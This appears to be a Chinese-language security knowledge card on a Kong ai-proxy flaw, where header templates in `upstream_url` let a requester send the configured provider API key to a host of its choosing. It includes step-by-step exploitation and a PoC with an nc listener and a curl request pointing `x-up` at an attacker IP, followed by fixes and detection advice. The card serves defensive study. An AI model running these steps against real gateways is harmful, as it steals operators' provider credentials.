---
id: ai-security-gateway-security-kong-ai-proxy-upstream-template-key-leak
title: Kong ai-proxy upstream_url 请求头模板展开导致 provider 密钥外泄
type: scenario
domain: ai-security
path: ai-security/gateway-security
technique: ai-gateway-provider-key-exfil-via-upstream-template
aliases:
- Kong upstream_url 模板注入
- $(headers.x-up) 密钥外泄
- AI 网关 provider 密钥 SSRF
- Kong ai-proxy 凭证转发
- upstream_url 请求驱动
tags:
- ai-security
- kong
- ai-gateway
- llm
- ssrf
- credential-leak
- template-injection
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
affected_versions: Kong Gateway OSS 3.9.3
verification:
  verified_by: verifier-V108
  verified_at: '2026-11-05T22:26:31+08:00'
  notes: '已对照原文核对：shared.lua 模板展开三类来源、openai.lua 主机/密钥拼接、x-up 指定 127.0.0.1:9000 后监听器收到 Authorization: Bearer SECRET_KEY_LEAK_123，控制组去掉头 400 且 0 记录，截图 emb05/emb06 与正文一致；未复跑'
---

## 一句话结论

Kong Gateway OSS 3.9.3 的 ai-proxy 允许在 `model.options.upstream_url` 中写 `$(headers.xxx)` 之类的模板，用请求头决定上游主机；而 provider 密钥来自插件配置，最终两者被拼进同一个上游请求，任何能向该路由发请求的客户端都可以把配置里的密钥带到自己指定的 IP。

## 原理

- **模板展开**：`kong/llm/drivers/shared.lua` 的 `conf_from_request` 支持三类取值来源——`headers`、`uri_captures`、`query_params`，全部来自请求。`upstream_url` 的 schema 使用通用 URL 类型，只校验 scheme 与主机格式，没有目标白名单，因此 `http://$(headers.x-up)/v1/chat/completions` 这样的字符串能通过校验并被正常加载。
- **密钥拼接**：`kong/llm/drivers/openai.lua` 从解析后的 URL 取 `host`/`scheme`/`path` 并调用 `set_target`，同时从 `conf.auth` 取 `header_name` 与 `header_value` 组装 `Authorization`。主机来自可被请求展开的 URL，密钥来自配置，两段代码各自都正确，但拼在同一个发往上游的请求上。
- **信任边界错配**：传统网关假设“配置可信、请求不可信”。这里“密钥发给谁”由请求方参与决定，而“密钥是什么”由配置方决定，两个不同信任域的值被合并使用。单独看每一环都合法：URL 校验通过、模板展开成功、密钥头拼装正常；合起来才构成外泄。
- **不是单纯的 SSRF**：能改配置的人本来就能改上游地址，单独报 SSRF 没有增量。成立的条件需要两个角色——能写配置的人埋下模板，能发请求的人填值。多租户网关为每个租户分配不同上游地址时会自然使用这类模板，正是风险场景。
- **实测限制**：该实验环境没有配置 DNS resolver，Kong 只接受 IP 字面量作为上游主机，写成 `localhost` 或域名会被拒绝（`no host allowed while connecting to upstream`）。攻击者使用 IP 即可，不影响结论。

## 触发条件

- Kong OSS（原文实测 3.9.3）启用 ai-proxy，provider 密钥配置在 `auth.header_value`；
- `model.options.upstream_url` 含有请求驱动的模板变量（`$(headers.*)`、`$(uri_captures.*)` 或 `$(query_params.*)`）；
- 攻击者能向该代理路由发送请求（通常普通 API 用户即可）；
- 上游连接允许访问攻击者控制的 IP（出网或同网段可达）。

## 利用步骤

1. 确认目标路由由 ai-proxy 处理，且上游地址使用模板。黑盒侧可尝试在请求中带上不同请求头，观察响应或出网行为；配置侧直接检查声明式配置里的 `upstream_url` 是否含 `$(`。
2. 在攻击者控制的 IP 上启动一个记录请求头的 HTTP 监听器。
3. 向 Kong 代理发送请求，附带模板引用的请求头，值为 `攻击者IP:端口`。
4. 监听器收到上游请求，检查 `Authorization` 是否为配置中的 provider 密钥。
5. 做控制组：去掉该请求头再发一次，模板展开为空导致请求失败（原文为 400），监听器零记录，证明取值确实来自请求而非其他路径。

## PoC

```bash
# 配置片段（示意）
# upstream_url: http://$(headers.x-up)/v1/chat/completions
# auth.header_name: Authorization
# auth.header_value: Bearer <provider-key>

# 攻击者侧：任意记录请求头的 HTTP 服务（示例用 nc 观察原始请求）
nc -lvnp 9000

# 触发：x-up 指定监听器地址
curl -X POST http://<kong>:8000/ai \
  -H "x-up: <attacker-ip>:9000" \
  -H "Content-Type: application/json" \
  -d '{"messages":[{"role":"user","content":"hi"}]}'
```

监听器应看到类似：

```text
POST /v1/chat/completions
Host: <attacker-ip>
Authorization: Bearer <provider-key>
```

控制组（不带 `x-up`）：请求返回 400，监听器无记录。

## 变体与关联

- 变体：`uri_captures`。路由正则含命名捕获时，URL 路径中的对应段就是填值来源，攻击者拼一个路径即可完成，不需要自定义请求头；`query_params` 同理。
- 关联 [[web-generic-ssrf-cloud-metadata]]：同样是“请求控制目标地址”，区别是本卡的目标不是读取内网响应，而是把配置中的高价值凭证送到攻击者主机。
- 关联同层卡片 [[ai-security-gateway-security-apisix-kong-secret-at-rest-audit]]（密钥在存储侧是否真的加密）与 [[ai-security-gateway-security-higress-ai-proxy-internal-header-forgery]]（凭证在网关内部的归属信号可被伪造），三张卡分别对应密钥的“去向、存放、归属”。
- 边界：`upstream_url` 为静态地址时不存在此问题；若部署了 DNS resolver 且攻击者只能用域名，仍可通过可控域名/IP 完成；CDN 或上游白名单会改变可达性。

## 检测与防御

- **修复**：禁用 `upstream_url` 的模板展开；或对展开结果做主机白名单（仅允许配置中枚举的上游域名/IP），拒绝内网与任意 IP；多租户场景改用路由级插件实例而非字符串模板，把租户边界交给路由。
- **临时缓解**：在声明式配置和 Admin API 上加校验，拒绝含 `$(` 的 `upstream_url`；Admin API 只监听 `127.0.0.1`；配置快照与 deck 仓库按密钥管理。
- **检测**：审计配置中的 `$(...)` 模板；监控 ai-proxy 上游目标地址的非预期变化；在出网侧检查上游请求的 `Host` 是否属于已知 provider/自建后端；若怀疑已泄露，立即轮换 provider 密钥并检查账单。
